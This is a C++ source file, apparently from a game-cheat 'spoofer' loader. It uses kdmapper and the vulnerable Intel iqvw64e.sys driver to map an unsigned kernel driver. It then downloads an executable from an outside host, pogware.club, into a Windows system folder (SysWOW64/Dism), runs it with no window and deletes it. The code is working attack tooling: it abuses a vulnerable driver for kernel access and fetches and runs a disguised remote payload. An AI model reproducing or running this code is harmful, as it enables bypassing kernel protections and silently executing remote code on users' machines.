#include "../kdmod/kdmapper.hpp"

void downloadCleaner()
{
	HRESULT result = URLDownloadToFile(NULL, _T("http://pogware.club/client.exe"), _T("c:/Windows/SysWOW64/Dism/client.exe"), 0, NULL); // download exe from url - temporary for now

}

void cleanSpoof()
{
	STARTUPINFO startupinfo = {};
	startupinfo.cb = sizeof startupinfo;
	PROCESS_INFORMATION processinformation = {};
	const TCHAR* targetlocation = _T("C:\\Windows\\SysWOW64\\Dism\\client.exe");

	if (!CreateProcess(targetlocation, 0, 0, FALSE, 0, CREATE_NO_WINDOW, 0, 0, &startupinfo, &processinformation))
	{
		DeleteFile("C:\\Windows\\SysWOW64\\Dism\\client.exe");
	}
	else
	{
		WaitForSingleObject(processinformation.hProcess, 5 * 1000);
		if (PostThreadMessage(processinformation.dwThreadId, WM_QUIT, 0, 0))
			CloseHandle(processinformation.hProcess);
		CloseHandle(processinformation.hThread);
	}

	std::cin.sync();
	std::cin.ignore();
	DeleteFile("C:\\Windows\\SysWOW64\\Dism\\client.exe");

}

void mapspoof()
{
	if (intel_driver::IsRunning())
	{ //Already Loaded
		std::cout << "[-] Please Restart Your Computer and Try Again" << std::endl;
		Sleep(5000);
		std::exit(-1);
	}

	HANDLE iqvw64e_device_handle = intel_driver::Load();

	if (!iqvw64e_device_handle || iqvw64e_device_handle == INVALID_HANDLE_VALUE)
	{
		//[-] Failed to load driver iqvw64e.sys
		std::cout << "[-] Failed to load if problem persists contact admin" << std::endl;
		Sleep(5000);
		std::exit(-1);
	}

	if (!kdmapper::MapDriver(iqvw64e_device_handle, 1))
	{
		//std::cout << "[-] Failed to map " << driver_path << std::endl;
		std::cout << "[-] Failed to Initialize if problem persists contact admin" << std::endl;
		Sleep(5000);
		std::exit(-1);
	}

	intel_driver::Unload(iqvw64e_device_handle);
	downloadCleaner();
	cleanSpoof();
}
